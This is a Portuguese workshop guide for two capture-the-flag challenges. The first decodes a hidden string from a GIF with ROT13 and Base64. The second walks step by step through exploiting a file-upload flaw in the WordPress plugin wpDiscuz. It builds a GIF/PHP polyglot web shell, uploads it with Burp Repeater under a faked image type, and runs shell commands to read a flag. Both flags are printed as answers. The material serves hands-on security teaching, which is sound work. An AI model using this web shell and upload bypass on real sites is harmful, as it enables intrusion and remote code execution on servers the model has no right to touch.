# Minicurso — Guia do Participante (exploração ao vivo)

> Vamos resolver **2 desafios** juntos. O servidor do WordPress **já está no ar** (o palestrante fornece a URL).
> Você só precisa do **navegador** e do **Burp Suite**.

## Antes de começar
- **Ferramentas** (instale se ainda não tiver — PowerShell):
  ```powershell
  winget install Mozilla.Firefox
  winget install PortSwigger.BurpSuite.Community
  ```
- **O palestrante vai te dar:**
  1. O arquivo **`RiceCat.gif`**.
  2. A **URL do alvo WordPress** (ex.: `https://algo.trycloudflare.com`). Anote como **`ALVO`**.

---

## Desafio 1 — RiceCat  (só navegador)

**Objetivo:** achar a senha escondida **depois do fim** do arquivo GIF.

1. Abra o **CyberChef**: https://gchq.github.io/CyberChef/ (ou o arquivo offline que o palestrante passar).
2. Arraste **`RiceCat.gif`** para a caixa **Input**.
3. Adicione a operação **`Strings`** e coloque *Minimum length* = `16`.
   → No Output aparece, no fim, uma string de 32 caracteres:
   ```
   H0IQG01Dq24lAKgFZJZmK0AuA19VLGq9
   ```
4. **Copie** essa string, **limpe a receita** e cole a string na Input.
5. Monte a receita com 2 operações, nesta ordem:
   1. **`ROT13`**
   2. **`From Base64`**
   → Resultado:
   ```
   SECOMPwn25{R1c3_Ca7_Ha7}
   ```
   > Dica: o botão **magic wand 🪄** do CyberChef também detecta ROT13+Base64 sozinho.

🏁 **Flag esperada:** `SECOMPwn25{R1c3_Ca7_Ha7}`

---

## Desafio 2 — wordpress  (navegador + Burp Suite)

**Objetivo:** subir um arquivo `.php` disfarçado de imagem (falha de upload do plugin **wpDiscuz**)
e executar comandos para ler a **`/flag`**.

### Passo 1 — Crie o payload (arquivo que é "imagem + PHP")
No PowerShell:
```powershell
cd $env:TEMP
@'
GIF89a
<?php system($_GET["c"]); ?>
'@ | Set-Content -Encoding ascii shell.php
```
> Alternativa (Bloco de Notas): 2 linhas — `GIF89a` e `<?php system($_GET["c"]); ?>`.
> Ao salvar, escolha **"Todos os arquivos"** para não virar `.txt`.

### Passo 2 — Abra o navegador do Burp e visite um post
1. No **Burp Suite**: *Proxy → Intercept → Open Browser* (usa o proxy do Burp automaticamente).
2. Acesse o **post** no alvo, ex.: `ALVO/?p=1` — role até os comentários (formulário do wpDiscuz).
3. Pegue o **nonce**: no HTML da página procure o campo `wmu_nonce` (é um input hidden) e **copie o valor**.
   > No Firefox: `Ctrl+U` (ver código-fonte) e `Ctrl+F` por `wmu_nonce`.

### Passo 3 — Envie o upload malicioso (Burp Repeater)
Jeito mais fácil e à prova de erro:
1. Faça um upload **normal** de qualquer imagem pelo botão de anexo do wpDiscuz.
2. No Burp (*HTTP history*), ache a requisição para **`/wp-admin/admin-ajax.php`** com
   `action=wmuUploadFiles` → clique com o direito → **Send to Repeater**.
3. No **Repeater**, altere **duas coisas** na parte do arquivo:
   - `filename="....."` → **`filename="shell.php"`**
   - o **conteúdo** do arquivo → cole o polyglot:
     ```
     GIF89a
     <?php system($_GET["c"]); ?>
     ```
   - deixe o `Content-Type` desse campo como **`image/gif`**.
4. Confirme que estão presentes: `action=wmuUploadFiles`, `wmu_nonce` (o que você copiou),
   `postId=1` e o arquivo em **`wmu_files[]`**. Clique **Send**.
5. A resposta é um **JSON** com a URL do arquivo, algo como:
   ```
   ALVO/wp-content/uploads/2026/09/shell-<numeros>.php
   ```

### Passo 4 — Execute e leia a flag
Abra no navegador (o espaço vira `%20`):
```
ALVO/wp-content/uploads/2026/09/shell-<numeros>.php?c=cat%20/flag
```
→ aparece:
```
SECOMPwn25{|)0n't_u$3_outdat3|)_plug1n_1n_y0ur_0utd@t3d_wor|)pres$_duuh!}
```

🏁 **Flag esperada:** `SECOMPwn25{|)0n't_u$3_outdat3|)_plug1n_1n_y0ur_0utd@t3d_wor|)pres$_duuh!}`

---

## Deu errado? Confira rápido
- **`msgUploadingNotAllowed`** na resposta → avise o palestrante (o upload de visitante precisa estar ligado).
- **`-1` / nonce inválido** → recopie o `wmu_nonce` da página do post (ele muda) e reenvie.
- **404 ao ler a flag** → confira a URL exata que veio no JSON (o nome tem um número de tempo no fim).
